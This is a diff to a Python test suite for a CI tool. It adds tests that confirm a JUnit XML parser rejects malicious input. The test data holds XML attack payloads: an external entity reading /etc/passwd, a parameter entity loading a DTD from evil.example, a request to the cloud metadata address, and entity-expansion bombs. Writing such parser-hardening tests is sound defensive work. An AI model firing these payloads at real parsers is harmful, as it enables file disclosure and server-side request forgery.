@@ -283,6 +283,7 @@ class TestInstallCI(Base):
         self.cfg(sinks=[{"type": "webhook", "url_env": "SG_TEST_HOOK"}])
         r = run(self.repo, "publish", env={"SG_TEST_HOOK": f"http://127.0.0.1:{srv.server_port}/hook"})
         self.assertEqual(r.returncode, 1, r.stdout + r.stderr); self.assertIn("sink webhook FAILED", r.stdout)
+        self.assertNotIn("evil.example", r.stdout); self.assertNotIn(str(srv.server_port), r.stdout)  # no address in the log
 
 
 class TestHardening(Base):
@@ -8188,13 +8189,18 @@ class TestReviewFixes(Base):
         d = Path(tempfile.mkdtemp())
         late = b"<?xml version='1.0'?><!--" + b"x" * 3000 + b'--><!DOCTYPE t SYSTEM "http://169.254.169.254/x"><testsuite/>'
         bomb = b'<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><testsuite><testcase name="&b;"/></testsuite>'
-        for name, raw in (("late", late), ("bomb", bomb)):
+        external = b'<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/passwd">]><testsuite><testcase name="&x;"/></testsuite>'
+        recursive = b'<!DOCTYPE t [<!ENTITY a "&b;"><!ENTITY b "&a;">]><testsuite/>'
+        param = b'<!DOCTYPE t [<!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p;]><testsuite/>'
+        for name, raw in (("late", late), ("bomb", bomb), ("external", external), ("recursive", recursive), ("parameter", param)):
             with self.subTest(name=name):
                 (d / "r.xml").write_bytes(raw)
                 with self.assertRaises((ValueError, ET.ParseError)):
                     G.junit(d / "r.xml")
                 with self.assertRaises(ValueError):
                     G._parse_xml_without_dtd(raw)  # the parser itself refuses, not only the byte check
+        with self.assertRaises(ET.ParseError):  # an entity used without any DTD is simply undefined
+            G._parse_xml_without_dtd(b'<testsuite><testcase name="&undeclared;"/></testsuite>')
         (d / "ok.xml").write_bytes(b'<testsuite><testcase classname="m" name="t1"/><testcase name="t2"><failure/></testcase></testsuite>')
         self.assertEqual(G.junit(d / "ok.xml"), {"t1": "passed", "m.t1": "passed", "m::t1": "passed", "t2": "failed"})
 
